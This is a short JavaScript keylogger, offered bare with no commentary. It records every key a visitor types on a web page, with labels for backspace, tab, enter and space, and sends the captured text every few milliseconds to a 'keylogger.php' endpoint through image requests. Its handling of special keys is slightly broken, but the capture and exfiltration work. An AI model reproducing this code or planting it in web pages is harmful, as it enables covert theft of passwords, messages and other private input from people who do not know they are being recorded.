var keys='';

document.addEventListener("keydown", function(event) {
if (event.keyCode == 8) {
  keys = '[backspace]';
}
if (event.keyCode == 9) {
  keys = '[tab]';
}
if (event.keyCode == 13) {
  keys = '[enter]';
}
if (event.keyCode == 32) {
  keys = '[space]';
}   
});
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
if(keys != '') {
  new Image().src = 'keylogger.php?c='+encodeURIComponent(keys);
  keys = '';
}
}, 5);
